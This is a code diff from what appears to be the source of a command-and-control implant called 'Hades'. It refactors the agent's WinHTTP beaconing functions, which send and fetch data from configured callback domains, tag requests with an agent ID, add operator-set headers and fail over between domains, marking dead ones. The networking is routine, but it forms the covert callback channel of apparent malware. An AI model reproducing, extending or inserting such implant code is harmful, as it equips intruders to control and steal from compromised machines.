@@ -67,9 +67,9 @@ BOOL Network::DoPostSingle(PBYTE toSend, SIZE_T len, DomainEntry* domain) {
 	DWORD reqFlags = domain->isHttps ? WINHTTP_FLAG_SECURE : 0;
 	WCHAR Header[64];
 
-	DEBUG_LOG_WIDE(L"Sending Request to %ls%ls\n", domain->domain, conf->PostEndpoint);
+	DEBUG_LOG_WIDE(L"Sending Request to %ls%ls\n", domain->domain, hades->config->PostEndpoint);
 
-	hSession = this->HttpApis->WinHttpOpen(conf->UA, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+	hSession = this->HttpApis->WinHttpOpen(NULL, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
 		WINHTTP_NO_PROXY_NAME,
 		WINHTTP_NO_PROXY_BYPASS, 0);
 	if (!hSession) goto CLEANUP;
@@ -77,10 +77,14 @@ BOOL Network::DoPostSingle(PBYTE toSend, SIZE_T len, DomainEntry* domain) {
 	hConnect = this->HttpApis->WinHttpConnect(hSession, domain->domain, domain->port, 0);
 	if (!hConnect) goto CLEANUP;
 
-	hRequest = this->HttpApis->WinHttpOpenRequest(hConnect, L"POST", conf->PostEndpoint, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, reqFlags);
+	hRequest = this->HttpApis->WinHttpOpenRequest(hConnect, L"POST", hades->config->PostEndpoint, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, reqFlags);
 	if (!hRequest) goto CLEANUP;
 	swprintf_s(Header, L"X-Agent-ID: %u\r\n", this->HadesID);
 	if (!this->HttpApis->WinHttpAddRequestHeaders(hRequest, Header, (DWORD)-1, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE)) {
+		DEBUG_LOG("Failed Set header: %d\n", GetLastError());
+		goto CLEANUP;
+	}
+	if (!this->HttpApis->WinHttpAddRequestHeaders(hRequest, hades->config->Headers, (DWORD)-1, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE)) {
 		DEBUG_LOG("Failed Set header: %d\n", GetLastError());
 		goto CLEANUP;
 	}
@@ -123,7 +127,7 @@ BOOL Network::DoGetSingle(PBYTE* ResponseBuf, SIZE_T size, DomainEntry* domain, 
 	DWORD openFlags = domain->isHttps ? WINHTTP_FLAG_SECURE : 0;
 	WCHAR Header[64];
 
-	hSession = this->HttpApis->WinHttpOpen(conf->UA, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+	hSession = this->HttpApis->WinHttpOpen(NULL, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
 	if (!hSession) {
 		DEBUG_LOG("Failed hSession: %d\n", GetLastError());
 		goto CLEANUP;
@@ -134,10 +138,14 @@ BOOL Network::DoGetSingle(PBYTE* ResponseBuf, SIZE_T size, DomainEntry* domain, 
 		goto CLEANUP;
 	}
 
-	hRequest = this->HttpApis->WinHttpOpenRequest(hConnect, L"GET", conf->GetEndpoint, NULL, WINHTTP_NO_REFERER,
+	hRequest = this->HttpApis->WinHttpOpenRequest(hConnect, L"GET", hades->config->GetEndpoint, NULL, WINHTTP_NO_REFERER,
 		WINHTTP_DEFAULT_ACCEPT_TYPES, openFlags);
 	if (!hRequest) {
 		DEBUG_LOG("Failed hRequest: %d\n", GetLastError());
+		goto CLEANUP;
+	}
+	if (!this->HttpApis->WinHttpAddRequestHeaders(hRequest, hades->config->Headers, (DWORD)-1, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE)) {
+		DEBUG_LOG("Failed Set header: %d\n", GetLastError());
 		goto CLEANUP;
 	}
 
@@ -222,11 +230,11 @@ CLEANUP:
 BOOL Network::DoPost(PBYTE toSend, SIZE_T len) {
 	BOOL ok = FALSE;
 
-	for (int i = 0; i < conf->domaincounts && !ok; i++) {
-		if (conf->domains[i].isDead) continue;
+	for (int i = 0; i < hades->config->domaincounts && !ok; i++) {
+		if (hades->config->domains[i].isDead) continue;
 
 		for (UINT j = 0; j < MAX_RETRYS; j++) {
-			if (this->DoPostSingle(toSend, len, &conf->domains[i])) {
+			if (this->DoPostSingle(toSend, len, &hades->config->domains[i])) {
 				ok = TRUE;
 				break;
 			}
@@ -238,8 +246,8 @@ BOOL Network::DoPost(PBYTE toSend, SIZE_T len) {
 		}
 
 		if (!ok) {
-			if (conf->domains[i].isSecondChance) { conf->domains[i].isDead = TRUE; }
-			else { conf->domains[i].isSecondChance = TRUE; }
+			if (hades->config->domains[i].isSecondChance) { hades->config->domains[i].isDead = TRUE; }
+			else { hades->config->domains[i].isSecondChance = TRUE; }
 		}
 	}
 
@@ -250,11 +258,11 @@ BOOL Network::DoPost(PBYTE toSend, SIZE_T len) {
 BOOL Network::DoGet(PBYTE* ResponseBuf, SIZE_T size, ULONG id, UINT* FinalSize, UINT* capacity) {
 	BOOL ok = FALSE;
 
-	for (int i = 0; i < conf->domaincounts && !ok; i++) {
-		if (conf->domains[i].isDead) continue;
+	for (int i = 0; i < hades->config->domaincounts && !ok; i++) {
+		if (hades->config->domains[i].isDead) continue;
 
 		for (UINT j = 0; j < MAX_RETRYS; j++) {
-			if (this->DoGetSingle(ResponseBuf, size, &conf->domains[i], id, FinalSize, capacity)) {
+			if (this->DoGetSingle(ResponseBuf, size, &hades->config->domains[i], id, FinalSize, capacity)) {
 				ok = TRUE;
 				break;
 			}
@@ -266,8 +274,8 @@ BOOL Network::DoGet(PBYTE* ResponseBuf, SIZE_T size, ULONG id, UINT* FinalSize, 
 		}
 
 		if (!ok) {
-			if (conf->domains[i].isSecondChance) { conf->domains[i].isDead = TRUE; }
-			else { conf->domains[i].isSecondChance = TRUE; }
+			if (hades->config->domains[i].isSecondChance) { hades->config->domains[i].isDead = TRUE; }
+			else { hades->config->domains[i].isSecondChance = TRUE; }
 		}
 	}
 
